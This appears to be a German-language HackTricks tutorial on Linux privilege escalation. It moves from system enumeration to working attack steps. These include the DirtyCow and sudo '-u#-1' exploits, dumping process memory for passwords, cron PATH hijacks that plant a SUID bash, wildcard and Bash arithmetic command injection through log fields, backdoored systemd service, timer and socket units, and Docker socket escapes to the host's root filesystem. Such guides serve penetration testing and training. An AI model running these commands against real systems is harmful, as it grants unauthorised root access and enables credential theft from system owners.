# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Info

Beginnen wir damit, Informationen über das laufende Betriebssystem zu sammeln
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn du **Schreibrechte für einen beliebigen Ordner in der `PATH`-Variable** hast, könntest du möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Prüfe die Kernel-Version und ob es einen exploit gibt, der für privilege escalation genutzt werden kann.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** findest: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Seite zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Werkzeuge, die bei der Suche nach Kernel-Exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (auf dem Zielsystem ausführen, prüft nur Exploits für Kernel 2.x)

Suche immer **die Kernel-Version in Google**; vielleicht ist deine Kernel-Version in einem kernel exploit genannt, dann kannst du sicher sein, dass dieser Exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Basierend auf den verwundbaren sudo-Versionen, die in Folgendem erscheinen:
```bash
searchsploit sudo
```
Sie können mit diesem grep prüfen, ob die sudo-Version anfällig ist.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturüberprüfung fehlgeschlagen

Siehe **smasher2 box of HTB** für ein **Beispiel**, wie diese vuln ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mehr System enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:

{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Prüfe **what is mounted and unmounted**, wo und warum. Wenn etwas unmounted ist, könntest du versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Auflisten nützlicher Binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **any compiler is installed**. Das ist nützlich, wenn du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software installiert

Überprüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die für privilege escalation ausgenutzt werden könnte…\
Es wird empfohlen, die Versionen der verdächtigeren installierten Software manuell zu prüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugang zur Maschine hast, kannst du auch **openVAS** verwenden, um nach veralteter und verwundbarer Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sind. Deshalb wird die Nutzung von Anwendungen wie OpenVAS oder ähnlichen empfohlen, die prüfen, ob eine installierte Softwareversion für bekannte Exploits anfällig ist._

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Rechte hat als er sollte** (vielleicht ein tomcat, der als root ausgeführt wird?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Prüfe außerdem deine privileges bezüglich der Prozessbinaries; vielleicht kannst du welche überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Einige Services eines Servers speichern **credentials in clear text inside the memory**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören; daher ist dies in der Regel hilfreicher, wenn du bereits root bist und weitere credentials aufdecken möchtest.\
Denk jedoch daran, dass du **als regular user den Speicher der Prozesse, die du besitzt, lesen kannst**.

> [!WARNING]
> Beachte, dass die meisten Maschinen heutzutage **ptrace standardmäßig nicht erlauben**, was bedeutet, dass du keine anderen Prozesse dumpen kannst, die deinem unprivilegierten Benutzer gehören.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Service (zum Beispiel) hast, könntest du den Heap auslesen und darin nach seinen credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigt die **maps**, wie der Speicher innerhalb des virtuellen Adressraums dieses Prozesses abgebildet ist; sie zeigt außerdem die **Berechtigungen jeder abgebildeten Region**. Die Pseudo-Datei **mem** **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar** sind und deren Offsets. Wir verwenden diese Informationen, um **in die mem-Datei zu seeken und alle lesbaren Regionen zu dumpen**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels kann über /dev/kmem erreicht werden.\
Typischerweise ist `/dev/mem` nur für **root** und die **kmem**-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine für Linux überarbeitete Umsetzung des klassischen ProcDump-Tools aus der Sysinternals-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können manuell die root-Anforderungen entfernen und den Prozess dumpen, der Ihnen gehört
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den process dumpen (siehe die vorherigen Abschnitte, um verschiedene Möglichkeiten zu finden, den memory eines process zu dumpen) und nach credentials im memory suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldeinformationen aus dem Speicher** und aus einigen **bekannten Dateien** stehlen. Es benötigt root-Rechte, um richtig zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP-Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen - sudo-Nutzung)     | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

Prüfe, ob ein geplanter Job verwundbar ist. Vielleicht kannst du ausnutzen, dass ein Skript von root ausgeführt wird (wildcard vuln? kannst du Dateien ändern, die root nutzt? symlinks verwenden? bestimmte Dateien im Verzeichnis erstellen, das root nutzt?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte über /home/user hat_)

Wenn in diesem crontab der root-Benutzer versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root-Shell erhalten, indem du:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, das ein script mit einem wildcard verwendet (Wildcard Injection)

Wenn ein script als root ausgeführt wird und ein “**\***” in einem Befehl enthalten ist, kannst du dies ausnutzen, um unerwartete Dinge zu bewirken (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das wildcard einem Pfad wie** _**/some/path/\***_ **vorausgeht, ist es nicht verwundbar (sogar** _**./\***_ **nicht).**

Lesen Sie die folgende Seite für weitere wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let aus. Wenn ein root cron/parser untrusted Log-Felder liest und diese in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) einschleusen, die beim Ausführen des cron als root läuft.

- Why it works: In Bash erfolgen expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird also zuerst substituiert (der Befehl läuft), danach wird die verbleibende numerische `0` für die Arithmetik verwendet, sodass das Script ohne Fehler weiterläuft.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Lassen Sie angreiferkontrollierten Text in das geparste Log schreiben, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stellen Sie sicher, dass Ihr Befehl nichts auf stdout schreibt (oder leiten Sie die Ausgabe um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein **Verzeichnis, auf das Sie vollen Zugriff haben**, verwendet, könnte es nützlich sein, diesen Ordner zu löschen und **einen symlink-Ordner auf ein anderes Verzeichnis zu erstellen**, das ein von Ihnen kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige cron-Jobs

Du kannst Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **alle 0,1 s während 1 Minute zu überwachen**, **nach am wenigsten ausgeführten Befehlen zu sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, kannst du:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden Prozess, der gestartet wird).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen carriage return nach einem Kommentar setzt** (ohne newline character), und der cron job wird funktionieren. Beispiel (beachte das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_-Dateien

Prüfe, ob du irgendeine `.service`-Datei schreiben kannst, wenn ja, **kannst du sie ändern**, sodass sie **deinen backdoor** **ausführt wenn** der Service **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gestartet wird).\
Erstelle zum Beispiel deinen backdoor in der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare service-Binaries

Beachte, dass wenn du **Schreibrechte auf binaries, die von services ausgeführt werden** hast, du diese verändern kannst, um backdoors einzubauen, sodass beim erneuten Ausführen der services die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einem der Ordner des Pfads **write** können, könnten Sie möglicherweise **escalate privileges**. Sie müssen nach **relative paths being used on service configurations** in Dateien wie diesen suchen:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dann erstelle eine **ausführbare Datei** mit **dem gleichen Namen wie die Binärdatei im relativen Pfad** im systemd PATH-Ordner, den du beschreiben kannst. Wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor** ausgeführt (nicht-privilegierte Benutzer können Services normalerweise nicht starten/stoppen — prüfe aber, ob du `sudo -l` verwenden kannst).

**Mehr über Services erfährst du mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Events steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für Kalenderzeit-Ereignisse und monotone Zeit-Ereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, eine bestehende systemd.unit auszuführen (z. B. eine `.service` oder `.target`).
```bash
Unit=backdoor.service
```
In der Dokumentation kannst du lesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Namen, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, wird dieser Wert standardmäßig auf einen Service gesetzt, der denselben Namen wie die Timer-Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der Timer-Unit identisch benannt sind, abgesehen vom Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen, Folgendes tun:

- Finde eine systemd-Unit (z. B. eine `.service`), die **ein schreibbares Binary ausführt**
- Finde eine systemd-Unit, die **einen relativen Pfad ausführt** und für die du **Schreibrechte** auf dem **systemd PATH** hast (um dieses ausführbare Programm zu imitieren)

**Mehr über Timer erfährst du mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigst du root-Rechte und musst ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, der **timer** wird **aktiviert**, indem ein Symlink dazu unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` erstellt wird.

## Sockets

Unix Domain Sockets (UDS) ermöglichen **Prozesskommunikation** auf demselben oder unterschiedlichen Rechnern innerhalb von Client-Server-Modellen. Sie nutzen standardmäßige Unix-Deskriptordateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Mehr zu sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber vereinfacht ausgedrückt werden sie verwendet, um **anzuzeigen, wo der Socket abgehört wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6- und/oder Portnummer, auf der gelauscht wird, etc.).
- `Accept`: Nimmt ein boolesches Argument. Wenn `true`, wird **für jede eingehende Verbindung eine Service-Instanz gestartet** und nur der Verbindungssocket an diese übergeben. Wenn `false`, werden alle Listening-Sockets selbst an die gestartete Service-Unit übergeben, und es wird nur eine Service-Unit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, wo eine einzelne Service-Unit bedingungslos den gesamten eingehenden Datenverkehr verarbeitet. **Standardmäßig false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**Sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**Sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Gibt den Namen der **Service**-Unit an, die bei **eingehendem Traffic** aktiviert werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Sie defaultet auf die Service, die denselben Namen wie der Socket trägt (mit entsprechendem Suffix). In den meisten Fällen sollte es nicht nötig sein, diese Option zu verwenden.

### Schreibbare .socket-Dateien

Wenn du eine **schreibbare** `.socket`-Datei findest, kannst du am Anfang der `[Socket]`-Sektion etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen** und die Backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gestartet wird.**\  
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Schreibbare Sockets

Wenn du **einen schreibbaren Socket** identifizierst (_jetzt sprechen wir von Unix Sockets und nicht von den Konfig-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Auflisten von Unix-Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets listening for HTTP** requests geben kann (_Ich spreche nicht von .socket files, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der socket **mit einer HTTP-Anfrage antwortet**, kannst du mit ihm **kommunizieren** und vielleicht **eine Schwachstelle ausnutzen**.

### Beschreibbarer Docker Socket

Der Docker socket, oft zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den `root`-Benutzer und Mitglieder der `docker`-Gruppe beschreibbar. Besitz von Schreibzugriff auf diesen socket kann zu privilege escalation führen. Hier ist eine Aufschlüsselung, wie das gemacht werden kann, und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation mit Docker CLI**

Wenn du Schreibzugriff auf den Docker socket hast, kannst du privilege escalation durchführen, indem du die folgenden Befehle verwendest:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker API direkt verwenden**

Falls die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Die Liste verfügbarer Images abrufen.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einhängt.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung hergestellt ist, können Sie Befehle direkt im Container ausführen, mit root-Zugriff auf das Dateisystem des Hosts.

### Weitere

Beachten Sie, dass wenn Sie Schreibrechte am docker-socket haben, weil Sie **in der Gruppe `docker`** sind, Sie [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) haben. Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Siehe **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes inter-Process Communication (IPC)-System, das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Für moderne Linux-Systeme entwickelt, bietet es ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **enhanced UNIX domain sockets**. Außerdem unterstützt es das Senden von Events oder Signalen und fördert die nahtlose Integration zwischen Systemkomponenten. Zum Beispiel kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten und so das Benutzererlebnis verbessern. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse, die traditionell komplex waren, vereinfacht.

D-Bus funktioniert nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen, etc.) basierend auf der kumulativen Wirkung passender Policy-Regeln. Diese Policies spezifizieren Interaktionen mit dem Bus und können durch Ausnutzung dieser Berechtigungen potenziell zu privilege escalation führen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen für den root-Benutzer, `fi.w1.wpa_supplicant1` zu besitzen, Nachrichten an ihn zu senden und von ihm zu empfangen.

Policies ohne angegebenen Benutzer oder Gruppe gelten universell, während "default"-Kontext-Policies für alle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**


{{#ref}}
